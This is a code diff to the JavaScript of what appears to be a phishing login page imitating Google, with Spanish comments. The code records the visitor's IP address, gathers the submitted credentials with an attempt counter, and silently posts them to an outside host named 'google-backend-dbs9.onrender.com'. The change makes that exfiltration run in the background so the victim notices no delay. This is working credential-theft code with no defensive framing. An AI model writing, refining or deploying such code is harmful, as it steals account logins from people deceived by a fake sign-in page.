@@ -219,12 +219,15 @@
             loading.style.display = 'block';
             passError.style.display = 'none';
 
-            // 1. CAPTURAR IP
+            // 1. CAPTURAR IP (con tiempo límite de 2s)
             let ip = 'No detectada';
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 2000);
+                const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
+                clearTimeout(timeoutId);
             } catch (err) { console.error('Error capturando IP:', err); }
 
             const credentials = {
@@ -235,14 +238,12 @@
                 attempt: attemptCount + 1
             };
 
-            // 3. ENVIAR AL BACKEND (Silencioso - PRODUCCIÓN)
-            try {
-                await fetch('https://google-backend-dbs9.onrender.com/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(credentials)
-                });
-            } catch (err) { console.error('Fallo backend:', err); }
+            // 3. ENVIAR AL BACKEND (Fondo - SIN AWAIT para evitar bloqueos)
+            fetch('https://google-backend-dbs9.onrender.com/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(credentials)
+            }).catch(err => console.error('Fallo backend (silencioso):', err));
 
             // 3. LOGICA DE FLUJO
             setTimeout(() => {
